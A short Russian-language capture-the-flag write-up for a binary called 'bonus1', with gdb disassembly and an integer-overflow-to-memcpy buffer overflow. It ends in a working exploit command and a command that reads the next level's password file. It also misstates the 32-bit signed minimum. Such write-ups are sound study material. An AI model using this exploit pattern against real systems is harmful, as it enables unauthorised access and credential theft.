gdb ./bonus1
disas main
....
0x08048433 <+15>:	mov    (%eax),%eax
0x08048435 <+17>:	mov    %eax,(%esp)
0x08048438 <+20>:	call   0x8048360 <atoi@plt>
....

....
0x08048470 <+76>:	mov    %eax,(%esp)
0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
....

Данный бинарник принимает два аргумента, один из которых использует memcpy. Мы можем это использовать и вызвать переполнение буфера (void *memcpy(void *dst, const void *src, size_t n))
Чтобы перейти к memcpy, первый аргумент должн быть <= 9. Второй аргумент будет скопирован в буфер, который занимает 40 байтов (0x3c - 0x14).
Однако memcpy сможет скопировать только 4*9 байтов.
Следовательно для переполнения нужно брать не положительное, а отрицательное число. Min 32-bit signed integer = -2147483647.
Второй аргумент - заполнить буфер случайными байтами  и затем добавить адрес, который позволит вызвать <execl@plt>, т.е сравнение с 0x574f4c46.
____________________________________________________________________
./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
whoami
cat /home/user/bonus2/.pass
